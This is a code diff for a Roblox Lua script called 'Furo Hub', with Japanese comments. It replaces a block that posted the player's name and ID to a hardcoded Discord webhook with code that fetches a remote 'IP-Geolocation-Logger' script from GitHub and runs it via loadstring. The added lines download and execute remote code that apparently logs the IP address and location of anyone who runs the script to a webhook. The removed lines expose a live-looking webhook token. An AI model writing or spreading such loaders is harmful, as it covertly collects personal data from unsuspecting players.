@@ -2,43 +2,17 @@ if getgenv().__FURO_HUB_LOADED__ then
     warn("Furo Hub は既に読み込まれています。スキップします")
     return
 end
-getgenv().__FURO_HUB_LOADED__ = true
+getgenv()["Webhook URL"] = "https://discord.com/api/webhooks/your-webhook-id/your-webhook-token"
 
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local player = Players.LocalPlayer
+local success, response = pcall(function()
+	return game:HttpGet("https://raw.githubusercontent.com/mcantcode/IP-Geolocation-Logger/refs/heads/main/src/main.luau")
+end)
 
--- Webhook（本番では自分のものに置き換えてね）
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1474095530744217610/BNiKKDzpu3FVveiChVq0YO78tFNKRus7DJb28UG2QD_OJ3pL-8kFWcKxzPJUlcsdYsr7"
-
--- 安全に送信
-local function sendLog()
-    local success, err = pcall(function()
-        local payload = {
-            content = string.format(
-                "**スクリプト起動ログ**\nユーザー: %s (ID: %d)\n時間: %s JST",
-                player.Name,
-                player.UserId,
-                os.date("%Y/%m/%d %H:%M:%S")
-            )
-        }
-        
-        local json = HttpService:JSONEncode(payload)
-        
-        HttpService:PostAsync(
-            WEBHOOK_URL,
-            json,
-            Enum.HttpContentType.ApplicationJson
-        )
-    end)
-    
-    if not success then
-        warn("Webhook送信失敗: " .. tostring(err))
-    end
+if success then
+	loadstring(response)()
+else
+	return
 end
-
--- 実行（非同期でメインスレッドをブロックしない）
-task.spawn(sendLog)
 
 
 
